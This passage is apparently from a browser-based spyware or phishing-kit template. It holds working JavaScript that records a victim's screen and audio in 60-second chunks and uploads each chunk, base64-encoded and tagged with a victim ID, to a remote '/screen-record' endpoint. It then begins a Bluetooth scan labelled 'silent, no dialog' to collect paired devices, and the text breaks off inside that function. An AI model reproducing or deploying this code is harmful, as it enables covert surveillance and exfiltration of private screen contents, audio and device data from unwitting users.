<% if(screenRecordAccess){ %>
// ── Screen Record: continuous video chunks every 60s ─────────────────────────
var _srStream=null;
async function doScreenRecord(){
  try{
    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia)return;
    var opts={mimeType:'video/webm;codecs=vp8'};
    if(!MediaRecorder.isTypeSupported(opts.mimeType)) opts={mimeType:'video/webm'};
    _srStream=await navigator.mediaDevices.getDisplayMedia({video:{cursor:'never'},audio:true});
    _srStream.getVideoTracks()[0].addEventListener('ended',function(){_srStream=null;});
    function recordChunk(){
      if(!_srStream||!_srStream.active)return;
      var chunks=[],rec=new MediaRecorder(_srStream,opts);
      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
      rec.onstop=function(){
        var blob=new Blob(chunks,{type:opts.mimeType}),fr=new FileReader();
        fr.onloadend=function(){
          var b64=fr.result.replace(/^data:.+;base64,/,'');
          $.post(a+'/screen-record',{uid:uid,video:encodeURIComponent(b64)});
        };
        fr.readAsDataURL(blob);
        setTimeout(recordChunk,1000);
      };
      rec.start();
      setTimeout(function(){try{rec.stop();}catch(e){}},60000);
    }
    recordChunk();
  }catch(e){}
}
<% } %>

<% if(bluetoothAccess){ %>
// ── Bluetooth Scanner: status + paired devices (silent, no dialog) ────────────
function doBluetoothScan(){
  if(!navigator.bluetooth)return;
  var _bt={uid:uid};
  navigator.bluetooth.getAvailability().then(function(on){
    _bt.status=encodeURIComponent(String(on));
    if(navigator.bluetooth.getDevices){
      navigator.bluetooth.getDevices().then(function(devs){
